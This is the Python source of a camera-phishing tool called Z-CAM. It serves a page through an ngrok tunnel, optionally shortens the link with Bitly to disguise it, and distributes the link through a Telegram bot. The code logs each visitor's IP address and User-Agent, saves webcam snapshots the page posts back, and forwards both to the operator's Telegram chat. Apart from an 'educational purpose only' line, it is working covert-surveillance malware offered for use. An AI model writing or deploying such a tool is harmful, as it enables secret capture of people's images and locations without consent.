#!/usr/bin/python3

from telebot import types
import telebot
from constraints import API_KEY, BITLY_ACCESS_TOKEN, ngrok_auth_token
import threading
from flask import Flask, render_template, request 
from datetime import datetime
import base64
import os
from pyngrok import ngrok
import pyfiglet
import logging
import pyshorteners
import requests

try:
    # telegram 
    bot = telebot.TeleBot(API_KEY, parse_mode=None)
    
    # bitly
    s = pyshorteners.Shortener(api_key=BITLY_ACCESS_TOKEN)

    # colors
    class bcolors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKCYAN = '\033[96m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'


    # banner 
    result = pyfiglet.figlet_format("Z-CAM")
    print(f"{bcolors.OKBLUE}{result}{bcolors.ENDC}")
    print(f"\t\t\t {bcolors.BOLD}Github: @sankethj{bcolors.ENDC}")
    print("")

    # disable unwanted logs
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    os.environ["FLASK_ENV"] = "development"
    app = Flask(__name__)
    app.debug = False
    fport = 5000

    # webhook port
    PORT = int(os.environ.get('PORT', 5000))

    # ngrok auth-token
    ngrok.set_auth_token(ngrok_auth_token)
    public_url = ngrok.connect(fport).public_url
    final_ngrok = public_url[:4] + "s" + public_url[4:]

    # url shorten or not
    shorten = input(f"{bcolors.WARNING} Do you want to use Bitly to shorten url link? ['y' or 'n']: {bcolors.ENDC}")
    if shorten == 'y' or shorten == 'Y' or shorten == 'Yes' or shorten =='yes':
        final_ngrok = s.bitly.short(final_ngrok)
    else:
        final_ngrok = final_ngrok

    # telegram bot building
    global tgbot
    tgbot = input(f"{bcolors.WARNING} Do you want telegram bot support? ['y' or 'n']: {bcolors.ENDC}")
    if tgbot == 'y' or tgbot == 'Y' or tgbot == 'Yes' or tgbot =='yes':

        @bot.message_handler(commands=["link"])
        def send_link_and_image(msg):
            bot.reply_to(msg, final_ngrok)
            global user_id
            user_id = msg.chat.id

        @bot.message_handler(commands=["shorten_link"])
        def send_shortend_link(msg):
            s_final_ngrok = s.bitly.short(final_ngrok)
            bot.reply_to(msg, s_final_ngrok)
            global user_id
            user_id = msg.chat.id

        @bot.message_handler(commands=["start"])
        def send_start_message(msg):
            bot.reply_to(msg,"Welcome.....ZCam tool is for Eductaional purpose only. Use /help for more info. Support @Team_ETF for more..... JOIN: https://youtube.com/channel/UCJnx0yDhcTLWM3ZrAtSvaIw")
            global user_id
            user_id = msg.chat.id

        @bot.message_handler(commands=["help"])
        def send_help_message(msg):
            bot.reply_to(msg,"Use /menu for menu window. Use /link to get ngrok link. Use /shorten_link to get bitly masked link.")
            global user_id
            user_id = msg.chat.id

        @bot.message_handler(commands=["menu"])
        def show_menu_page(msg):
            markup = types.ReplyKeyboardMarkup(row_width=1)
            btn1 = types.KeyboardButton("/start")
            btn2 = types.KeyboardButton("/link")
            btn3 = types.KeyboardButton("/shorten_link")
            btn4 = types.KeyboardButton("/help")
            markup.add(btn1,btn2,btn3,btn4)
            bot.send_message(chat_id=msg.chat.id, text="Choose from menu", reply_markup=markup)
            global user_id
            user_id = msg.chat.id
            
    else:
        pass

    
    #final ngrok link
    print(f" * ngrok tunnel link ->   {bcolors.OKCYAN}{final_ngrok}{bcolors.ENDC}")
    app.config["BASE_URL"] = public_url

    # flask
    @app.route("/",methods=['POST','GET'])
    def home():

        # get request
        if request.method == 'GET':
            now = str(datetime.now())
            req = requests.get('http://localhost:4040/api/requests/http').json()
            user_agent = req['requests'][0]['request']['headers']['User-Agent'][0]        
            ip_address = req['requests'][0]['request']['headers']['X-Forwarded-For'][0]

            # writing file
            file1 = open('myfile.txt', 'a')
            file1.write("Date and Time:\t")
            file1.write(str(now))
            file1.write("\nIP:\t")
            file1.write(str(ip_address))
            file1.write("\nUser-Agent:\t")
            file1.write(str(user_agent))
            file1.write("\n\n")
            file1.close()

            if tgbot == "y":
                # sending log message to telegram bot
                log_msg = "Time: "+ str(now) +"      "+"IP_ADDRESS: "+ str(ip_address) +"       "+"USER-AGENT: "+ str(user_agent)
                to_url2 = "https://api.telegram.org/bot"+ API_KEY +"/sendMessage?chat_id="+ str(user_id) +"&text="+ str(log_msg)
                requests.get(to_url2)

            print(f"{now} \t {bcolors.OKCYAN}{ip_address}{bcolors.ENDC} \t {user_agent}\t")

        # post request
        elif request.method == 'POST':
            now = str(datetime.now())

            # setting path to save file in capture dir
            save_path = 'capture'
            file_name = 'img_'+now+'.png'
            completeName = os.path.join(save_path, file_name)

            # requesting base64 image data 
            req_data = request.get_json() 
            encoded = req_data['canvasData']

            # writing file
            file2 = open(completeName, 'wb')
            data = base64.b64decode(encoded)
            file2.write(data)
            file2.close()
            
            print(f"{bcolors.OKGREEN}[{bcolors.ENDC}+{bcolors.OKGREEN}] Cam image recieved.{bcolors.FAIL} \n ")

            if tgbot == "y":
                # sending photo to telegram bot
                data = {"chat_id": user_id, "caption": ""}
                to_url = 'https://api.telegram.org/bot{}/sendPhoto'.format(API_KEY)
                with open(completeName, "rb") as image_file:
                    requests.post(to_url, data=data, files={"photo": image_file})

        return render_template("saycheese.html")
        
    # threading to run flask with pyngrok smoothly
    threading.Thread(target=app.run, kwargs={"use_reloader": False}).start()
    bot.polling()
    

except KeyboardInterrupt:
    print(f"{bcolors.FAIL} Ending task.....\n")